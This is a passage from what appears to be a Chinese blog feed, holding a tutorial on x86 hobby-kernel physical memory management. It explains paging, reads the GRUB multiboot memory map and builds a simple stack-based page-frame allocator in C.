class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/image-20240510212154383.png" alt="image-20240510212154383"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-5-物理内存管理的实现</title>
    <url>/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="9-物理内存管理的实现"><a href="#9-物理内存管理的实现" class="headerlink" title="9.物理内存管理的实现"></a>9.物理内存管理的实现</h1><h2 id="9-1分页式的内存管理"><a href="#9-1分页式的内存管理" class="headerlink" title="9.1分页式的内存管理"></a>9.1分页式的内存管理</h2><img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513202714321.png" alt="image-20240513202714321" style="zoom:50%;">

<p>线性地址是连续的，<strong>但是其实际指向的 物理地址就不见得是连续的了</strong></p>
<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513202919077.png" alt="image-20240513202919077" style="zoom:67%;">

<p>虚拟 内存实质上就是把物理内存中暂<strong>时用不到的内容暂时换出到外存里</strong>，空出内存放置现阶段 需要的数据。<strong>至于替换的策略当然有相应的算法了，比如最先换入原则，最少使用原则等 等方法可以使用</strong></p>
<p><strong>分级页表：</strong>以32位的地址来说，分为3段来寻址，分别是地址的低12位，中间10位和高10位。</p>
<ol>
<li>高 10位表示当前地址项在页目录中的偏移，最终偏移处指向对应的页表，</li>
<li>中间10位是当前地 址在该页表中的偏移，我们按照这个偏移就能查出来最终指向的物理页了，</li>
<li>最低的12位表 示当前地址在该物理页中的偏移</li>
</ol>
<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513203948806.png" alt="image-20240513203948806" style="zoom:67%;">

<p><strong>本章主要解决一下三个问题：</strong></p>
<ol>
<li>如何获取可用物理内存的大小和地址？ </li>
<li>采用什么样的数据结构来描述物理内存？ </li>
<li>申请和释放物理内存的算法如何实现？</li>
</ol>
<h2 id="问题一：如何获取可用物理内存的大小和地址？"><a href="#问题一：如何获取可用物理内存的大小和地址？" class="headerlink" title="问题一：如何获取可用物理内存的大小和地址？"></a>问题一：如何获取可用物理内存的大小和地址？</h2><p>在GRUB中已经获取物理内存的分布，并且将它们放置下面的成员里</p>
<blockquote>
<p>include&#x2F;multiboot.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">typedef</span></span><br><span class="line"><span class="number">2</span> <span class="class"><span class="keyword">struct</span> <span class="title">multiboot_t</span> &#123;</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span> ... ...</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span> <span class="comment">/**</span></span><br><span class="line"><span class="comment">7 * 以下两项指出保存由 BIOS 提供的内存分布的缓冲区的地址和长度</span></span><br><span class="line"><span class="comment">8 * mmap_addr 是缓冲区的地址， mmap_length 是缓冲区的总大小</span></span><br><span class="line"><span class="comment">9 * 缓冲区由一个或者多个下面的 mmap_entry_t 组成</span></span><br><span class="line"><span class="comment">10 */</span></span><br><span class="line"><span class="number">11</span> <span class="type">uint32_t</span> mmap_length;</span><br><span class="line"><span class="number">12</span> <span class="type">uint32_t</span> mmap_addr;</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span> ... ...</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span> &#125; __attribute__((packed)) <span class="type">multiboot_t</span>;</span><br><span class="line"><span class="number">17</span></span><br><span class="line"><span class="number">18</span> <span class="comment">/**</span></span><br><span class="line"><span class="comment">19 * size 是相关结构的大小，单位是字节，它可能大于最小值 20</span></span><br><span class="line"><span class="comment">20 * base_addr_low 是启动地址的低位，32base_addr_high 是高 32 位，启动地址总共有 64 位</span></span><br><span class="line"><span class="comment">21 * length_low 是内存区域大小的低位，32length_high 是内存区域大小的高 32 位，总共是 64 位</span></span><br><span class="line"><span class="comment">22 * type 是相应地址区间的类型，1 代表可用，所有其它的值代表保留区域 RAM</span></span><br><span class="line"><span class="comment">23 */</span></span><br><span class="line"><span class="number">24</span> <span class="keyword">typedef</span></span><br><span class="line"><span class="number">25</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmap_entry_t</span> &#123;</span></span><br><span class="line"><span class="number">26</span> <span class="type">uint32_t</span> size; <span class="comment">// size 是不含 size 自身变量的大小</span></span><br><span class="line"><span class="number">27</span> <span class="type">uint32_t</span> base_addr_low;</span><br><span class="line"><span class="number">28</span> <span class="type">uint32_t</span> base_addr_high;</span><br><span class="line"><span class="number">29</span> <span class="type">uint32_t</span> length_low;</span><br><span class="line"><span class="number">30</span> <span class="type">uint32_t</span> length_high;</span><br><span class="line"><span class="number">31</span> <span class="type">uint32_t</span> type;</span><br><span class="line"><span class="number">32</span> &#125; __attribute__((packed)) <span class="type">mmap_entry_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GRUB将内存探测的结果按<strong>每个分段整理为mmap_entry结构体的数组</strong>。<strong>mmap_addr是这 个结构体数组的首地址，mmap_length是整个数组的长度。</strong></p>
<blockquote>
<p>mm&#x2F;pmm.c 打印所有物理内存段的操作：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_addr = glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_length = glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Memory map:\n&quot;</span>);</span><br><span class="line">    <span class="comment">// mmap_addr是数组的起始地址 首地址  mmaplength 是长度</span></span><br><span class="line">    <span class="type">mmap_entry_t</span> *mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr;</span><br><span class="line">    <span class="keyword">for</span> (mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr; (<span class="type">uint32_t</span>)mmap &lt; mmap_addr + mmap_length; mmap++) &#123;</span><br><span class="line">        printk(<span class="string">&quot;base_addr = 0x%X%08X, length = 0x%X%08X, type = 0x%X\n&quot;</span>,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;base_addr_high , (<span class="type">uint32_t</span>)mmap-&gt;base_addr_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;length_high , (<span class="type">uint32_t</span>)mmap-&gt;length_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>script&#x2F;kernel.ld</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PROVIDE( kern_start = . );  // 加上这两个变量</span><br><span class="line">.text :</span><br><span class="line">&#123;</span><br><span class="line">	*(.text)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.data :</span><br><span class="line">&#123;</span><br><span class="line">	*(.data)</span><br><span class="line">	*(.rodata)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.bss :</span><br><span class="line">&#123;</span><br><span class="line">	*(.bss)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.stab :</span><br><span class="line">&#123;</span><br><span class="line">	*(.stab)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.stabstr :</span><br><span class="line">&#123;</span><br><span class="line">	*(.stabstr)</span><br><span class="line"> 	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">PROVIDE( kern_end = . ); // 加上这两个变量</span><br></pre></td></tr></table></figure>

<p>需要知道内核本身加载到物理内存的信息，通过链接器脚本</p>
<blockquote>
<p>添加头文件 include&#x2F;pmm.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_PMM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_PMM_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核文件在内存中的起始和结束位置</span></span><br><span class="line"><span class="comment">// 在连接器脚本中定义了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_start[];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_end[];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出bios提供的物理内存布局</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>修改入口代码 init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// `sti` 指令的作用是设置中断标志（Set Interrupt Flag）</span></span><br><span class="line">    <span class="comment">// asm volatile(&quot;sti&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示物理内存布局</span></span><br><span class="line">    printk(<span class="string">&quot;kernel in memory start: 0x%08X\n&quot;</span>, kern_start);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory end: 0x%08X\n&quot;</span>, kern_end);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory used: %d KB\n\n&quot;</span>, (kern_end - kern_start + <span class="number">1023</span>) / <span class="number">1024</span>); <span class="comment">// 换算成kb</span></span><br><span class="line"></span><br><span class="line">    show_memory_map();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可用内存是两段 type1 表示ram可用内存，是1MB以下的0x0-0x9FC00和1M以上的0x100000-0x7EFE000两段。</p>
<p>本身的内核程序起始位置是 0x100000（1MB）  占用的内存大小为84KB</p>
<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513213039330.png" alt="image-20240513213039330" style="zoom:150%;">



<h2 id="问题二：采用什么样的数据结构来描述物理内存？"><a href="#问题二：采用什么样的数据结构来描述物理内存？" class="headerlink" title="问题二：采用什么样的数据结构来描述物理内存？"></a>问题二：采用什么样的数据结构来描述物理内存？</h2><blockquote>
<p>物理内存管理法— 伙伴算法：伙伴算法在申请和释放物理页框的时候会<strong>对物理页框进行合并操作，尽可能的 保证可用物理内存的连续性。</strong></p>
<ul>
<li>内部碎片：内部碎片就是已经被分配出去却不能被利用的内存空间，比如我们为了管理 方便，按照4KB内存块进行管理</li>
<li>外部碎片：内存频繁请求和释放大小不同的连续页框后，导致在已分配页框块周围分散了许多小 块空闲的页框，尽管这些空闲页框的总数可以满足接下来的请求，但却无法满足一个大块 的连续页框。</li>
</ul>
</blockquote>
<p>本项目涉及的内存管理方法：将物理页面的管理地址设定在1MB以上内核加载的结束位置之后，<strong>从这个起始位置到512MB的地址处将所有的物理内存按页划分， 将每页的地址放入栈里存储</strong>。这样在需要的时候就可以按页获取到物理内存了  — 通过栈实现</p>
<p><strong>主要的步骤</strong>：</p>
<ol>
<li>(kern_end - kern_start)内核加载完的结束位置到512MB的位置按照一个页4KB的大小划分页框</li>
<li>将页框依次压入栈中 — 每个页框的地址都会被记录下来</li>
<li>当需要分配使用物理内存的时候，弹出相应大小的页框地址</li>
<li>当系统释放内存的时候，将页框重新压入栈中</li>
</ol>
<p><strong>示例：</strong></p>
<p>假设内核加载结束位置是2MB（0x200000），那么从2MB到512MB的范围内的所有内存按4KB页框划分。栈中存储的地址可能依次是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00200000, 0x00201000, 0x00202000, ..., 0x1FFFE000</span><br></pre></td></tr></table></figure>

<p>当需要分配一个页框时，从栈中弹出一个地址，如<code>0x00200000</code>，然后将这个页框分配给需要的任务。当任务完成并释放这个页框时，地址<code>0x00200000</code>重新压入栈中，等待下次分配。</p>
<blockquote>
<p>include&#x2F;pmm.h 头文件修改</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_PMM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_PMM_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程栈的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_SIZE 8192</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持的最大物理内存 512MB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMM_MAX_SIZE 0x20000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存页框的大小 4KB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMM_PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最多支持的物理页面个数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAX_SIZE (PMM_MAX_SIZE / PMM_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页掩码按照 4096对齐</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHY_PAGE_MASK 0xFFFFF000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核文件在内存中的起始和结束位置</span></span><br><span class="line"><span class="comment">// 在连接器脚本中定义了</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_start[];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_end[];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态分配物理内存页的总数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> phy_page_count;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出bios提供的物理内存布局</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化物理内存管理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmm</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个内存页的物理地址</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmm_alloc_page</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放申请的内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(<span class="type">uint32_t</span> p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>mm&#x2F;pmm.c 文件</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存页面管理的栈</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> pmm_stack[PAGE_MAX_SIZE+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存管理的栈指针</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> pmm_stack_top;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物理内存页的数量</span></span><br><span class="line"><span class="type">uint32_t</span> phy_page_count;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_addr = glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_length = glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Memory map:\n&quot;</span>);</span><br><span class="line">    <span class="comment">// mmap_addr是数组的起始地址 首地址  mmaplength 是长度</span></span><br><span class="line">    <span class="type">mmap_entry_t</span> *mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr;</span><br><span class="line">    <span class="keyword">for</span> (mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr; (<span class="type">uint32_t</span>)mmap &lt; mmap_addr + mmap_length; mmap++) &#123;</span><br><span class="line">        printk(<span class="string">&quot;base_addr = 0x%X%08X, length = 0x%X%08X, type = 0x%X\n&quot;</span>,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;base_addr_high , (<span class="type">uint32_t</span>)mmap-&gt;base_addr_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;length_high , (<span class="type">uint32_t</span>)mmap-&gt;length_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_start_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_end_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr + glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">	<span class="type">mmap_entry_t</span> *map_entry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (map_entry = mmap_start_addr; map_entry &lt; mmap_end_addr; map_entry++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果是可用内存 ( 按照协议，1 表示可用内存，其它数字指保留区域 )</span></span><br><span class="line">		<span class="keyword">if</span> (map_entry-&gt;type == <span class="number">1</span> &amp;&amp; map_entry-&gt;base_addr_low == <span class="number">0x100000</span>) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 把内核结束位置到结束位置的内存段，按页存储到页管理栈里</span></span><br><span class="line">			<span class="comment">// 最多支持512MB的物理内存</span></span><br><span class="line">			<span class="type">uint32_t</span> page_addr = map_entry-&gt;base_addr_low + (<span class="type">uint32_t</span>)(kern_end - kern_start); <span class="comment">// 内核代码的起始和结束地址 </span></span><br><span class="line">			<span class="type">uint32_t</span> length = map_entry-&gt;base_addr_low + map_entry-&gt;length_low;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (page_addr &lt; length &amp;&amp; page_addr &lt;= PMM_MAX_SIZE) &#123;</span><br><span class="line">				pmm_free_page(page_addr);</span><br><span class="line">				page_addr += PMM_PAGE_SIZE;</span><br><span class="line">				phy_page_count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配一个内存页的物理地址</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmm_alloc_page</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(pmm_stack_top != <span class="number">0</span>, <span class="string">&quot;out of memory&quot;</span>);  <span class="comment">// 断言当条件不成立时（即 pmm_stack_top == 0），</span></span><br><span class="line">   												  <span class="comment">// 断言失败，程序会输出这个错误信息，并终止执行。</span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> page = pmm_stack[pmm_stack_top--];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放申请的内存 --- 就是把内存还回来了了</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(<span class="type">uint32_t</span> p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(pmm_stack_top != PAGE_MAX_SIZE, <span class="string">&quot;out of pmm_stack stack&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pmm_stack[++pmm_stack_top] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>解析：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_pmm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_start_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">	<span class="type">mmap_entry_t</span> *mmap_end_addr = (<span class="type">mmap_entry_t</span> *)glb_mboot_ptr-&gt;mmap_addr + glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">	<span class="type">mmap_entry_t</span> *map_entry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (map_entry = mmap_start_addr; map_entry &lt; mmap_end_addr; map_entry++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果是可用内存 ( 按照协议，1 表示可用内存，其它数字指保留区域 )</span></span><br><span class="line">		<span class="keyword">if</span> (map_entry-&gt;type == <span class="number">1</span> &amp;&amp; map_entry-&gt;base_addr_low == <span class="number">0x100000</span>) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 把内核结束位置到结束位置的内存段，按页存储到页管理栈里</span></span><br><span class="line">			<span class="comment">// 最多支持512MB的物理内存</span></span><br><span class="line">			<span class="type">uint32_t</span> page_addr = map_entry-&gt;base_addr_low + (<span class="type">uint32_t</span>)(kern_end - kern_start); <span class="comment">// 内核代码的起始和结束地址 </span></span><br><span class="line">			<span class="type">uint32_t</span> length = map_entry-&gt;base_addr_low + map_entry-&gt;length_low;                <span class="comment">// 计算需要分配内存块的长度</span></span><br><span class="line"> </span><br><span class="line">			<span class="keyword">while</span> (page_addr &lt; length &amp;&amp; page_addr &lt;= PMM_MAX_SIZE) &#123;</span><br><span class="line">				pmm_free_page(page_addr);    <span class="comment">//  放入栈中</span></span><br><span class="line">				page_addr += PMM_PAGE_SIZE;  <span class="comment">// 加上一页的大小</span></span><br><span class="line">				phy_page_count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <code>glb_mboot_ptr</code> 获取内存映射的起始和结束地址。</li>
<li>遍历每个内存映射条目，检查是否是可用内存并且起始地址是 <code>0x100000</code>（1MB以上）。</li>
<li>计算从内核结束位置开始的内存页地址，并按页存储到内存管理栈中。</li>
<li>使用 <code>pmm_free_page()</code> 函数将每个页地址放入栈中。</li>
</ul>
<p>while循环中：</p>
<ul>
<li><p><code>map_entry-&gt;base_addr_low</code>：这是内存映射条目的基地址，表示内存块的起始地址。</p>
</li>
<li><p><code>map_entry-&gt;length_low</code>：这是内存映射条目的长度，表示内存块的大小。</p>
</li>
<li><p><code>page_addr</code>：当前正在处理的内存页的地址。</p>
</li>
<li><p><code>length</code>：内存块的结束地址，用于确定内存块的范围。</p>
</li>
<li><p><code>PMM_MAX_SIZE</code>：系统支持的最大物理内存大小，在此假设为512MB。</p>
</li>
<li><p><code>pmm_free_page(page_addr)</code>：将当前页地址放入内存管理栈中。</p>
</li>
<li><p><code>page_addr += PMM_PAGE_SIZE</code>：将页地址移动到下一个页框（假设页框大小为4KB）。</p>
</li>
<li><p><code>phy_page_count++</code>：增加已处理的页框计数。</p>
</li>
</ul>
<blockquote>
<p>init&#x2F;entry.c </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// `sti` 指令的作用是设置中断标志（Set Interrupt Flag）</span></span><br><span class="line">    <span class="comment">// asm volatile(&quot;sti&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示物理内存布局</span></span><br><span class="line">    printk(<span class="string">&quot;kernel in memory start: 0x%08X\n&quot;</span>, kern_start);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory end: 0x%08X\n&quot;</span>, kern_end);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory used: %d KB\n\n&quot;</span>, (kern_end - kern_start + <span class="number">1023</span>) / <span class="number">1024</span>); <span class="comment">// 换算成kb</span></span><br><span class="line"></span><br><span class="line">    show_memory_map();</span><br><span class="line">    <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">    init_pmm();</span><br><span class="line"></span><br><span class="line">    printk_color(rc_black, rc_red, <span class="string">&quot;\nThe Count of Physical Memory Page is: %u\n\n&quot;</span>, phy_page_count); <span class="comment">// 栈中分配的物理也的大小</span></span><br><span class="line">    <span class="type">uint32_t</span> allc_addr = <span class="literal">NULL</span>;</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Test Physical Memory Alloc :\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    allc_addr = pmm_alloc_page(); <span class="comment">// 分配一个页 物理内存</span></span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span 